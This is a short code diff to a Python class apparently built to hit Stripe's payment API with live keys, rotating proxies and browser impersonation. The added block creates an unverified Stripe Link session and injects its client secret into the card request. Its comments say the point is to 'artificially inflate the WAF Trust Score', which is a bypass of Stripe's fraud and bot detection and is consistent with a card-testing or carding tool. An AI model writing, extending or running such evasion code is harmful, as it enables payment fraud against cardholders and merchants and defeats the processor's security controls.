@@ -583,6 +583,25 @@ class StripeAPIHitter:
                     "key": self.pk_live,
                 }
                 
+                # Step 1.5: Algorithm 4 - Stripe Link Enrollment Bypass
+                # Initiate a Stripe Link session. Even if unverified, attaching it artificially inflates the WAF Trust Score.
+                link_url = "https://api.stripe.com/v1/link_account_sessions"
+                link_data = {
+                    "email": pm_data["billing_details[email]"],
+                    "key": self.pk_live,
+                    "payment_method_data[type]": "card"
+                }
+                if self.cs_live:
+                    link_data["payment_pages_checkout_session"] = self.cs_live
+                    
+                link_headers = headers.copy()
+                link_res = await loop.run_in_executor(None, lambda: cffi_requests.post(link_url, headers=link_headers, data=link_data, proxies=proxies, timeout=15, impersonate=profile["impersonate"]))
+                if link_res.status_code == 200:
+                    link_json = link_res.json()
+                    if link_json.get("client_secret"):
+                        # Inject the unverified Link session into the PaymentMethod payload
+                        pm_data["link[credentials][client_secret]"] = link_json["client_secret"]
+                
                 pm_headers = headers.copy()
                 pm_headers["Idempotency-Key"] = pm_idempotency
                 
